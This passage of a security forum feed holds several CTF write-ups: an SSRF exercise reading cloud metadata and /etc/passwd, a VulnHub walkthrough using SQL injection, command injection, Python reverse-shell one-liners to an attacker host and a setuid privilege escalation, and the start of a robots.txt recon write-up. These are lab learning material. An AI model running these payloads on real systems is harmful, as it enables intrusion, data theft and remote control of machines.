            <p><img src="https://0x00sec.org/images/transparent.png" alt="header-ctf-0x00sec" data-orig-src="upload://wOiVhJMMswDlMlkqZB8w6ZTLfjQ.png" width="690" height="269"></p>
<h1>Writeup CTF 0x00sec Web - Exercise <span class="hashtag">#5</span>
</h1>
<p>Another day, another ctf challenge. This time no. 5 of the web exercises</p>
<p>As a small disclaimer, this will be a longer writeup, because I also documented where I was struggling and the dead ends I reached. Which were reached, because I tried to solve the challenge too early <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
<p>However, I think this process is also very interesting and I learned a lot!</p>
<h2>The Challenge</h2>
<p>Like always the first thing we do, is to check out the source code of the login page. As we can find a lot of useful information in there.</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="01-page-source" data-orig-src="upload://7Yfs58aQQG85Ryt6nTCgr34Vd6Z.png" width="690" height="481"></p>
<p>Like in the previous exercises we see the hint in the HTML comment.</p>
<pre><code class="lang-auto">
&lt;!-- TODO: --&gt;

&lt;!-- * Stop relying on Base64! I'm sorry... --&gt;

</code></pre>
<p>Furthermore, we see some hidden inputs, which seem interesting.</p>
<pre><code class="lang-auto">
&lt;input type="hidden" name="ip" value="87.123.162.39"&gt;

&lt;input type="hidden" name="p" value="aHR0cHM6Ly9pcGluZm8uaW8vODcuMTIzLjE2Mi4zOQ=="&gt;

</code></pre>
<p>Now let’s decode the base64 string:</p>
<pre><code class="lang-auto">
➜ echo "aHR0cHM6Ly9pcGluZm8uaW8vODcuMTIzLjE2Mi4zOQ==" | base64 -D

https://ipinfo.io/87.123.162.39%

</code></pre>
<p>So let’s check and click on Login to see what happens.</p>
<p>If we do so, we should see the the output of <a href="http://ipinfo.io" rel="noopener nofollow ugc">ipinfo.io</a>.</p>
<p>We can double check with</p>
<pre><code class="lang-auto">
curl https://ipinfo.io/87.123.162.39

</code></pre>
<p>We can now tinker a bit with it. Let’s for example base64 encode <code>http://www.google.de</code> and pass it as the value.</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="02-google" data-orig-src="upload://gK1J7KehdXO9AtXDmaJPOtTuEnE.png" width="690" height="285"></p>
<p>And we see a very weird looking google page. So we can assume, what’s happening in the backend is that the server grabs the base64 encoded string, decodes it, runs maybe a curl on it and renders the results.</p>
<p>But as we control the command parameter, the site is vulnerable to a Server <a href="https://owasp.org/www-community/attacks/Server_Side_Request_Forgery" rel="noopener nofollow ugc">Side Request Forgery Attack</a></p>
<h2>The Attack</h2>
<p>Well, we know the vulnerability now, but we do not really know how to abuse it.</p>
<p>Now comes the fun exploration part. We can try different inputs to see what is possible.</p>
<p>However, if you are not interested in the exploration and dead ends I’ve reached, you can skip to URL Scheme.</p>
<h3>Exploration</h3>
<p>To be honest I was also too much in Hack The Box mood, because I solved a box prior to the challenge and kind of gone bananas with it. I wanted to see what we can get out of it. Even tho, we know that this are <strong>Web</strong> exercises.</p>
<p>So I did a nmap scan, to see whats running there.</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="05-nmap" data-orig-src="upload://uuehzs7T2KWWt14vCLHMHVXwh4d.png" width="690" height="412"></p>
<p>And I also did a <code>whois 138.197.209.37</code> which returned that the IP belongs to Digital Ocean.</p>
<h3>Cloud Meta Data</h3>
<p>Well, we know that this is a Digital Ocean Droplet. So these cloud providers have some APIs for meta data. Which can hold interesting information like access keys.</p>
<p>I do not know the URL off my head so I checked <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#ssrf-url-for-digital-ocean" rel="noopener nofollow ugc">PayloadsAllTheThings</a> and encoded <code>http://169.254.169.254/metadata/v1.json</code> as base64 and submitted it.</p>
<p>And we got the response with tons of information. But nothing very useful for now.</p>
<h3>URL Scheme</h3>
<p>Currently we are providing an URL with <code>http</code> so that the client knows, how to handle it. Now it would be interesting to see if we can access files on the server.</p>
<p>Can we communicate over other protocols?</p>
<p>Spoiler alert: Yes, we can!</p>
<p>I’ve just grabbed the examples from PayloadsAllTheThings and base64 encoded</p>
<pre><code class="lang-auto">
sftp://evil.com:1337/

</code></pre>
<p>But I replaced <a href="http://evil.com" rel="noopener nofollow ugc">evil.com</a> with my own server, where I started a netcat listener.</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="06-sftp" data-orig-src="upload://iLEkxAw5D4wakhLspfzR7X2nhvs.png" width="395" height="116"></p>
<p>Then I send the request with the encoded sftp url and got a response!</p>
<p><img src="https://0x00sec.org/images/transparent.png" alt="07-sftp2" data-orig-src="upload://93mkXdIuULETOA3280NbvHAfYX0.png" width="349" height="107"></p>
<p>Still cool, but this will get us nowhere. It can’t be that hard right?</p>
<p>But what about the <code>file</code> scheme?</p>
<p>So let’s try to encode <code>file:///etc/passwd</code> as base64 and submit it.<br>
We can again either use <a href="https://gchq.github.io/CyberChef/" rel="noopener nofollow ugc">CyberChef</a> or your terminal with</p>
<pre><code class="lang-auto">echo -n 'file:///etc/passwd' | base64
</code></pre>
<p>Change the input value and yep! We can read files. And if we take a closer look to the content of <code>/etc/passwd</code> we can see the flag.</p>
<h2>Conclusion</h2>
<p>Very cool vulnerability which can be abused in a lot of ways.</p>
<ul>
<li><a href="https://hackerone.com/reports/115748" rel="noopener nofollow ugc">https://hackerone.com/reports/115748</a></li>
</ul>
            <p><small>4 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/writeup-0x00sec-ctf-exercise-5/20658">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/writeup-0x00sec-ctf-exercise-5/20658</link>
          <pubDate>Mon, 20 Apr 2020 15:14:24 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-20658</guid>
          <source url="https://0x00sec.org/t/writeup-0x00sec-ctf-exercise-5/20658.rss">Writeup: 0x00sec CTF - Exercise #5</source>
        </item>
        <item>
          <title>(VulnHub)[BoredHackerBlog: Cloud AV] WriteUp — Walkthrough</title>
          <dc:creator><![CDATA[DamaneDz]]></dc:creator>
          <category>CTF</category>
          <description><![CDATA[
            <p>VulnHub VM Box Link : <a href="https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/" rel="noopener nofollow ugc">https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/</a></p>
<p>Description:</p>
<blockquote>
<p>Cloud Anti-Virus Scanner! is a cloud-based antivirus scanning service.Currently, it’s in beta mode. You’ve been asked to test the setup and find vulnerabilities and escalate privs.Difficulty: EasyTasks involved:<br>
port scanning<br>
webapp attacks<br>
sql injection<br>
command injection<br>
brute forcing<br>
code analysisVirtual Machine:Format: Virtual Machine (Virtualbox OVA)<br>
Operating System: LinuxNetworking:<br>
DHCP Service: Enabled<br>
IP Address Automatically assignThis works better with VirtualBox than VMware</p>
</blockquote>
<p>Let’s run a NMAP Scan:</p>
<blockquote>
<p>nmap -sC -sV 192.168.9.101 --unprivileged<br>
Starting Nmap 7.80 ( <a href="https://nmap.org" rel="noopener nofollow ugc">https://nmap.org</a> ) at 2020-04-02 00:23 W. Central Africa Standard Time<br>
Strange read error from 192.168.9.101 (203 - ‘Unknown error’)<br>
Strange read error from 192.168.9.101 (203 - ‘Unknown error’)<br>
Strange read error from 192.168.9.101 (203 - ‘Unknown error’)<br>
Nmap scan report for 192.168.9.101<br>
Host is up (1.0s latency).<br>
Not shown: 995 closed ports<br>
PORT      STATE    SERVICE     VERSION<br>
22/tcp    open     ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>
| ssh-hostkey:<br>
|   2048 6a:42:4b:7c:2a:06:0f:50:4b:32:cf:b8:31:e9:c4:f4 (RSA)<br>
|   256 81:c7:60:0f:d7:1e:56:f7:a3:1e:9f:76:27:bd:31:27 (ECDSA)<br>
|_  256 71:90:c3:26:ba:3b:e8:b3:53:7e:73:53:27:4d:6b:af (ED25519)<br>
2000/tcp  filtered cisco-sccp<br>
8080/tcp  open     http        Werkzeug httpd 0.14.1 (Python 2.7.15+)<br>
|_http-title: Site doesn’t have a title (text/html; charset=utf-8).<br>
32769/tcp filtered filenet-rpc<br>
50636/tcp filtered unknown<br>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/" rel="noopener nofollow ugc">https://nmap.org/submit/</a> .<br>
Nmap done: 1 IP address (1 host up) scanned in 269.47 seconds</p>
</blockquote>
<p>All BoredHackerBlog VM’s are based on attacks against Werkzeug httpd</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/3/32ca2e9f3205a31bde2aa9cf5d57c1f71a5ee601.png" data-download-href="/uploads/short-url/7fj2Tyc6IXPlIEx0w41MULkkJ2h.png?dl=1" title=""><img src="/uploads/default/original/2X/3/32ca2e9f3205a31bde2aa9cf5d57c1f71a5ee601.png" alt="" data-base62-sha1="7fj2Tyc6IXPlIEx0w41MULkkJ2h" width="690" height="429" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/3/32ca2e9f3205a31bde2aa9cf5d57c1f71a5ee601_2_10x10.png"></a></div><p></p>
<p>So I had to intercept “ Invite Code “ request and sent via burpsuite intruder with special characters wordlist</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/2/289596306891100e738eb5ea5c6dd180dafd63fd.png" data-download-href="/uploads/short-url/5N1AnDkDp8xL1HHJyF57WDpZ7tj.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/2/289596306891100e738eb5ea5c6dd180dafd63fd_2_690x456.png" alt="" data-base62-sha1="5N1AnDkDp8xL1HHJyF57WDpZ7tj" width="690" height="456" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/2/289596306891100e738eb5ea5c6dd180dafd63fd_2_690x456.png, /uploads/default/original/2X/2/289596306891100e738eb5ea5c6dd180dafd63fd.png 1.5x, /uploads/default/original/2X/2/289596306891100e738eb5ea5c6dd180dafd63fd.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/2/289596306891100e738eb5ea5c6dd180dafd63fd_2_10x10.png"></a></div><p></p>
<p>We had 2 bad characters “ and \</p>
<p>and the status was for both 500 and in the response raw we noticed some</p>
<p>flask message errors / console</p>
<p>and by trying manually to inject one of these we got the console:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/2/24197c9315e9c8dc025cc5f398a712ed47a02e57.png" data-download-href="/uploads/short-url/59lNdeJk97vhqrX2GpS4VV7xBdl.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/2/24197c9315e9c8dc025cc5f398a712ed47a02e57_2_690x248.png" alt="" data-base62-sha1="59lNdeJk97vhqrX2GpS4VV7xBdl" width="690" height="248" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/2/24197c9315e9c8dc025cc5f398a712ed47a02e57_2_690x248.png, https://0x00sec.s3.amazonaws.com/optimized/2X/2/24197c9315e9c8dc025cc5f398a712ed47a02e57_2_1035x372.png 1.5x, /uploads/default/original/2X/2/24197c9315e9c8dc025cc5f398a712ed47a02e57.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/2/24197c9315e9c8dc025cc5f398a712ed47a02e57_2_10x10.png"></a></div><p></p>
<p>and we have no pin code for command execution so we had to look forward and this time with</p>
<p>SQLMap:</p>
<blockquote>
<p>sqlmap -r cloudantivirus_login -p password --risk 3 --level 5 --technique=“B” --dbms=SQLite --dump<br>
___<br>
<strong>H</strong><br>
___ <em><strong>[,]</strong></em>__ ___ ___  {1.4.3.12#dev}<br>
|_ -| . [(]     | .’| . |<br>
|<em><em><em>|</em>  [,]</em>|</em>|<em>|__,|  <em>|<br>
|</em>|V…       |</em>|   <a href="http://sqlmap.org" rel="noopener nofollow ugc">http://sqlmap.org</a>[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user’s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[<em>] starting @ 00:23:33 /2020-04-02/[00:23:33] [INFO] parsing HTTP request from ‘cloudantivirus_login’<br>
[00:23:34] [INFO] testing connection to the target URL<br>
[00:23:34] [INFO] checking if the target is protected by some kind of WAF/IPS<br>
[00:23:34] [INFO] testing if the target URL content is stable<br>
[00:23:34] [INFO] target URL content is stable<br>
[00:23:35] [WARNING] heuristic (basic) test shows that POST parameter ‘password’ might not be injectable<br>
[00:23:35] [INFO] testing for SQL injection on POST parameter ‘password’<br>
[00:23:35] [INFO] testing ‘AND boolean-based blind - WHERE or HAVING clause’<br>
[00:23:36] [INFO] testing ‘OR boolean-based blind - WHERE or HAVING clause’<br>
got a refresh intent (redirect like response common to login pages) to ‘/scan’. Do you want to apply it from now on? [Y/n] y<br>
[00:23:41] [INFO] testing ‘OR boolean-based blind - WHERE or HAVING clause (NOT)’<br>
[00:23:41] [INFO] POST parameter ‘password’ appears to be ‘OR boolean-based blind - WHERE or HAVING clause (NOT)’ injectable<br>
[00:23:41] [WARNING] in OR boolean-based injection cases, please consider usage of switch ‘–drop-set-cookie’ if you experience any problems during data retrieval<br>
[00:23:41] [INFO] checking if the injection point on POST parameter ‘password’ is a false positive<br>
POST parameter ‘password’ is vulnerable. Do you want to keep testing the others (if any)? [y/N] n<br>
sqlmap identified the following injection point(s) with a total of 259 HTTP(s) requests:<br>
Parameter: password (POST)<br>
Type: boolean-based blind<br>
Title: OR boolean-based blind - WHERE or HAVING clause (NOT)<br>
Payload: password=1" OR NOT 4631=4631-- EoHY<br>
[00:23:43] [INFO] testing SQLite<br>
[00:23:43] [INFO] confirming SQLite<br>
[00:23:43] [INFO] actively fingerprinting SQLite<br>
[00:23:43] [INFO] the back-end DBMS is SQLite<br>
back-end DBMS: SQLite<br>
[00:23:43] [INFO] fetching tables for database: ‘SQLite_masterdb’<br>
[00:23:43] [INFO] fetching number of tables for database ‘SQLite_masterdb’<br>
[00:23:44] [WARNING] running in a single-thread mode. Please consider usage of option ‘–threads’ for faster data retrieval<br>
[00:23:44] [INFO] retrieved: 1<br>
[00:23:44] [INFO] retrieved: code<br>
[00:23:44] [INFO] retrieved: CREATE TABLE <code>code</code> (  <code>password</code> TEXT )<br>
[00:23:47] [INFO] fetching entries for table ‘code’ in database ‘SQLite_masterdb’<br>
[00:23:47] [INFO] fetching number of entries for table ‘code’ in database ‘SQLite_masterdb’<br>
[00:23:47] [INFO] retrieved: 4<br>
[00:23:48] [INFO] retrieved: myinvitecode123<br>
[00:23:49] [INFO] retrieved: mysecondinvitecode<br>
[00:23:50] [INFO] retrieved: cloudavtech<br>
[00:23:51] [INFO] retrieved: mostsecurescanner<br>
Database: SQLite_masterdb<br>
Table: code<br>
[4 entries]<br>
±-------------------+<br>
| password           |<br>
±-------------------+<br>
| myinvitecode123    |<br>
| mysecondinvitecode |<br>
| cloudavtech        |<br>
| mostsecurescanner  |<br>
±-------------------+[00:23:52] [INFO] table ‘SQLite_masterdb.code’ dumped to CSV file ‘C:\Users\ADMIN\AppData\Local\sqlmap\output\192.168.9.101\dump\SQLite_masterdb\code.csv’<br>
[00:23:52] [WARNING] HTTP error codes detected during run:<br>
500 (Internal Server Error) - 60 times<br>
[00:23:52] [INFO] fetched data logged to text files under ‘C:\Users\ADMIN\AppData\Local\sqlmap\output\192.168.9.101’[</em>] ending @ 00:23:52 /2020-04-02/</p>
</blockquote>
<p>We have 4 invite codes !</p>
<blockquote>
<p>myinvitecode123<br>
mysecondinvitecode<br>
cloudavtech<br>
mostsecurescanner</p>
</blockquote>
<p>By trying one of these we are redirected to /scan</p>
<p><img src="/uploads/default/original/2X/0/08dc5aa49ae227f795ac934d061dd71872024c3f.png" alt="" data-base62-sha1="1gnVqh3fOefOvB1qMCcCdO7Tayz" width="629" height="461"></p>
<p>and we have a list of command that we can scan !</p>
<p>Scan with what ? … let’s try to scan the “hello” file …</p>
<p>and after 1m12s as shown below we had some kind of a virus scan</p>
<p><img src="/uploads/default/original/2X/a/a23a02af440506ff443d0eea8130e1377d9cee4b.png" alt="" data-base62-sha1="n97Dv2zZ6nwmEaWeI1nfR3zMRe3" width="444" height="315"></p>
<p>and no scanned files :0</p>
<p>Our Next step must be clever !</p>
<p>via BurpSuite we sent this :</p>
<blockquote>
<p>POST /output HTTP/1.1<br>
Host: 192.168.9.101:8080<br>
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0<br>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8<br>
Accept-Language: en-US,en;q=0.5<br>
Content-Type: application/x-www-form-urlencoded<br>
Content-Length: 26<br>
Referer: <a href="http://192.168.9.101:8080/scan" rel="noopener nofollow ugc">http://192.168.9.101:8080/scan</a><br>
Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.XoUw-A.i_sGFVAedfesEhev1zBmKhEuAPQ<br>
DNT: 1<br>
Connection: close<br>
Upgrade-Insecure-Requests: 1</p>
<p>filename=python+%7C+ls±la</p>
</blockquote>
<p>The response was:</p>
<blockquote>
<p>HTTP/1.0 200 OK<br>
Content-Type: text/html; charset=utf-8<br>
Content-Length: 345<br>
Vary: Cookie<br>
Server: Werkzeug/0.14.1 Python/2.7.15+<br>
Date: Thu, 02 Apr 2020 00:27:26 GMT</p>
<pre>total 24<br>
drwxrwxr-x 4 scanner scanner 4096 Oct 24  2018 .<br>
drwxr-xr-x 6 scanner scanner 4096 Oct 24  2018 …<br>
-rw-rw-r-- 1 scanner scanner 1550 Oct 24  2018 app.py<br>
-rw-r–r-- 1 scanner scanner 2048 Oct 21  2018 database.sql<br>
drwxrwxr-x 2 scanner scanner 4096 Oct 21  2018 samples<br>
drwxrwxr-x 2 scanner scanner 4096 Oct 21  2018 templates<br>
</pre>

</blockquote>
<p>let’s run 2 commands to read the app.py file and get the full path:</p>
<blockquote>
<p>python | cat app.py | pwd</p>
</blockquote>
<p>The response raw:</p>
<blockquote>
<p>HTTP/1.0 200 OK<br>
Content-Type: text/html; charset=utf-8<br>
Content-Length: 37<br>
Vary: Cookie<br>
Server: Werkzeug/0.14.1 Python/2.7.15+<br>
Date: Thu, 02 Apr 2020 00:30:27 GMT</p>
<pre>/home/scanner/cloudav_app<br>
</pre>

</blockquote>
<p>I wasn’t able to read the python file !</p>
<p>so from the begging I had to to that …</p>
<blockquote>
<p>filename=cat;cat /home/scanner/cloudav_app/app.py</p>
</blockquote>
<p>The response raw:</p>
<blockquote>
<p>HTTP/1.0 200 OK<br>
Content-Type: text/html; charset=utf-8<br>
Content-Length: 1788<br>
Vary: Cookie<br>
Server: Werkzeug/0.14.1 Python/2.7.15+<br>
Date: Thu, 02 Apr 2020 00:39:26 GMT</p>
<pre><br>
----------- SCAN SUMMARY -----------<br>
Known viruses: 2095534<br>
Engine version: 0.102.2<br>
Scanned directories: 0<br>
Scanned files: 0<br>
Infected files: 0<br>
Data scanned: 0.00 MB<br>
Data read: 0.00 MB (ratio 0.00:1)<br>
Time: 30.149 sec (0 m 30 s)<br>
from flask import Flask, render_template, request, session<br>
import sqlite3<br>
import subprocess<br>
import osconn = sqlite3.connect(‘database.sql’,check_same_thread = False)<br>
c = conn.cursor()app = Flask(<strong>name</strong>)<span class="mention">@app.route</span>(’/’)<br>
def index():<br>
return render_template(‘index.html’)<span class="mention">@app.route</span>(’/login’, methods=[‘POST’])<br>
def login():<br>
password = request.form[‘password’]<br>
if len(c.execute(‘select * from code where password="’ + password + ‘"’).fetchall()) &gt; 0:<br>
session[‘logged_in’] = True<br>
return ‘Redirecting to /scan. ’<br>
else:<br>
return “WRONG INFORMATION”<span class="mention">@app.route</span>(’/scan’)<br>
def shop():<br>
if session.get(‘logged_in’):<br>
filelist = subprocess.Popen(“ls -l /home/scanner/cloudav_app/samples”, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).stdout.read()<br>
return render_template(‘scan.html’,filelist=filelist)<br>
else:<br>
return ‘’<span class="mention">@app.route</span>(’/output’, methods=[‘POST’])<br>
def output():<br>
if session.get(‘logged_in’):<br>
filename = request.form[‘filename’]<br>
scan_results = subprocess.Popen("clamscan "+filename, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).stdout.read()<br>
return “<pre>” + scan_results + “</pre>”<br>
else:<br>
return ''if <strong>name</strong> == “<strong>main</strong>”:<br>
app.secret_key = os.urandom(12)<br>
app.run(host=‘0.0.0.0’,port=8080, debug=True)<br>
</pre>

</blockquote>
<p>and for a reverse shell we only have to send this</p>
<blockquote>
<p>cat;python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.9.1”,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);’</p>
</blockquote>
<p><img src="/uploads/default/original/2X/1/13769fc42f704c7d2731e1994a99bafffd5a85c2.png" alt="" data-base62-sha1="2MbdOIYQRjBhg1OT1Yv6UfU2SCC" width="617" height="161"></p>
<p>let’s run the Linux enumeration script “linpeas.sh”</p>
<p>Some notes from linpeas:</p>
<blockquote>
<p>[+] Users with console<br>
cloudav:x:1000:1000:cloudav:/home/cloudav:/bin/bash<br>
root:x:0:0:root:/root:/bin/bash<br>
scanner:x:1001:1001:scanner,:/home/scanner:/bin/bash[+] All users &amp; groups<br>
uid=0(root) gid=0(root) groups=0(root)<br>
uid=1000(cloudav) gid=1000(cloudav) groups=1000(cloudav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)<br>
uid=1001(scanner) gid=1001(scanner) groups=1001(scanner)[+] Looking for root files in home dirs (limit 20)<br>
/home<br>
/home/scanner/update_cloudav</p>
</blockquote>
<p>and by going to /home/scanner</p>
<blockquote>
<p>scanner@cloudav:~/cloudav_app$ cd /home/<br>
cd /home/<br>
scanner@cloudav:/home$ ls -la<br>
ls -la<br>
total 16<br>
drwxr-xr-x 4 root root 4096 Oct 21 2018 .<br>
drwxr-xr-x 23 root root 4096 Apr 1 21:08 …<br>
drwxr-xr-x 4 cloudav cloudav 4096 Oct 24 2018 cloudav<br>
drwxr-xr-x 6 scanner scanner 4096 Oct 24 2018 scanner<br>
scanner@cloudav:/home$ cd scanner<br>
cd scanner<br>
scanner@cloudav:~$ ls -la<br>
ls -la<br>
total 60<br>
drwxr-xr-x 6 scanner scanner 4096 Oct 24 2018 .<br>
drwxr-xr-x 4 root root 4096 Oct 21 2018 …<br>
-rw------- 1 scanner scanner 5 Oct 24 2018 .bash_history<br>
-rw-r–r-- 1 scanner scanner 220 Oct 21 2018 .bash_logout<br>
-rw-r–r-- 1 scanner scanner 3771 Oct 21 2018 .bashrc<br>
drwx------ 2 scanner scanner 4096 Oct 21 2018 .cache<br>
drwxrwxr-x 4 scanner scanner 4096 Oct 24 2018 cloudav_app<br>
drwx------ 3 scanner scanner 4096 Apr 2 00:50 .gnupg<br>
drwxrwxr-x 3 scanner scanner 4096 Oct 21 2018 .local<br>
-rw-r–r-- 1 scanner scanner 807 Oct 21 2018 .profile<br>
-rw-rw-r-- 1 scanner scanner 66 Oct 21 2018 .selected_editor<br>
-rwsr-xr-x 1 root scanner 8576 Oct 24 2018 update_cloudav<br>
-rw-rw-r-- 1 scanner scanner 393 Oct 24 2018 update_cloudav.c<br>
scanner@cloudav:~$ cat update_cloudav.c<br>
cat update_cloudav.c<br>
<span class="hashtag">#include</span> &lt;stdio.h&gt;int main(int argc, char *argv[])<br>
{<br>
char *freshclam="/usr/bin/freshclam";if (argc &lt; 2){<br>
printf(“This tool lets you update antivirus rules\nPlease supply command line arguments for freshclam\n”);<br>
return 1;<br>
}char *command = malloc(strlen(freshclam) + strlen(argv[1]) + 2);<br>
sprintf(command, “%s %s”, freshclam, argv[1]);<br>
setgid(0);<br>
setuid(0);<br>
system(command);<br>
return 0;}<br>
scanner@cloudav:~$ update_cloudav x;id<br>
update_cloudav x;id<br>
update_cloudav: command not found<br>
uid=1001(scanner) gid=1001(scanner) groups=1001(scanner)<br>
scanner@cloudav:~$ ./update_cloudav x;id<br>
./update_cloudav x;id<br>
ERROR: Problem with internal logger (UpdateLogFile = /var/log/clamav/freshclam.log).<br>
ERROR: initialize: libfreshclam init failed.<br>
ERROR: Initialization error!<br>
ERROR: /var/log/clamav/freshclam.log is locked by another process<br>
uid=1001(scanner) gid=1001(scanner) groups=1001(scanner)</p>
</blockquote>
<p>we have a vulnerably binary as it show in the C source code</p>
<blockquote>
<p><span class="hashtag">#include</span> &lt;stdio.h&gt;int main(int argc, char *argv[])<br>
{<br>
char *freshclam="/usr/bin/freshclam";if (argc &lt; 2){<br>
printf(“This tool lets you update antivirus rules\nPlease supply command line arguments for freshclam\n”);<br>
return 1;<br>
}char *command = malloc(strlen(freshclam) + strlen(argv[1]) + 2);<br>
sprintf(command, “%s %s”, freshclam, argv[1]);<br>
setgid(0);<br>
setuid(0);<br>
system(command);<br>
return 0;}</p>
</blockquote>
<p>We have some group id and user id set to 0 which means to root !</p>
<p>let’s try to play with it and get our root privileges …</p>
<p>First of all I created another python reverse shell in a sh file and I named it x.sh</p>
<blockquote>
<p>python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.9.1”,5656));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);’</p>
</blockquote>
<p>Let’s upload it to the current directory /home/scanner/</p>
<p><img src="/uploads/default/original/2X/f/fc730a2b49b774fd6fb481b7751723ff4e0842a6.png" alt="" data-base62-sha1="A1gNedUX9jQeJcsK6o8TLZp8pT0" width="672" height="181"></p>
<p>without forgetting to start listening on port 5656</p>
<p>after all of that we run this command :</p>
<blockquote>
<p>./update_cloudav “hello|bash x.sh”</p>
</blockquote>
<p>Automatically the bin file will set the GID/UID to 0 which means if the bash x.sh commands run we are root</p>
<p>going back to our listener we have a successfully connection … and we are R00T <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
<p><img src="/uploads/default/original/2X/8/873dacc18914603fa1fb01310893ba64081b7ee3.png" alt="" data-base62-sha1="jioAXS1HjeZw5SGuolNMfoKdvhh" width="644" height="132"></p>
            <p><small>3 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/vulnhub-boredhackerblog-cloud-av-writeup-walkthrough/20360">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/vulnhub-boredhackerblog-cloud-av-writeup-walkthrough/20360</link>
          <pubDate>Wed, 08 Apr 2020 16:32:07 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-20360</guid>
          <source url="https://0x00sec.org/t/vulnhub-boredhackerblog-cloud-av-writeup-walkthrough/20360.rss">(VulnHub)[BoredHackerBlog: Cloud AV] WriteUp — Walkthrough</source>
        </item>
        <item>
          <title>Writeup: 0x00sec CTF - Exercise #4</title>
          <dc:creator><![CDATA[H45uK1mchi]]></dc:creator>
          <category>CTF</category>
          <description><![CDATA[
            <p><span alt="header-ctf-0x00sec" data-base62-sha1="wOiVhJMMswDlMlkqZB8w6ZTLfjQ" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<h1>Writeup CTF 0x00sec Web - Exercise <span class="hashtag">#4</span>
</h1>
<p>Another day, another ctf challenge.  This time no. 4 of the web exercises</p>
<h2>The Challenge</h2>
<p>Like always we take a look at the page source first. Because after 3 challenges, we know that we most likely get a hint from there.</p>
<p><span alt="source" data-base62-sha1="opWw03x09UwmzkPea4ykAdytiKD" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>And yet again, we have a hint. This time it is:</p>
<pre><code>&lt;!-- TODO: --&gt;
&lt;!-- * Restrict debug log access--&gt;
</code></pre>
<p>We now know, that we have somewhere an accessible log file. But how to find it?</p>
<h2>The Attack</h2>
<p>There are multiple ways of finding some files. One easy way would be to spin up <a href="https://github.com/OJ/gobuster" title="Gobuster" rel="nofollow noopener">gobuster</a> and see if we get any results. I did it in the background while manually testing.</p>
<p>If you’re lucky you can also just guess the file name. I’ve tried <code>debug.txt</code>, <code>log.txt</code> and some other variations. But found nothing.</p>
<p>However, I also checked <code>robots.txt</code>. As it is present in most websites and can have some information leakage. The <a href="https://developers.google.com/search/reference/robots_txt" rel="nofollow noopener">robots.txt</a> handles what files and folders should be indexed or not indexed by search machine bots.</p>
<p>Which is kind of funny, because you are explicitly putting sensitive information in there. Like hey, we have a secret file or endpoint which should not be shown in google. But then it is in your <code>robots.txt</code> to prevent google from indexing it.</p>
<p>Well, we have luck because there is a robots.txt</p>
<p><span alt="robots" data-base62-sha1="w722sBTdb73WdexDiZ9divK6cFO" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>And gobuster also returns us this result:</p>
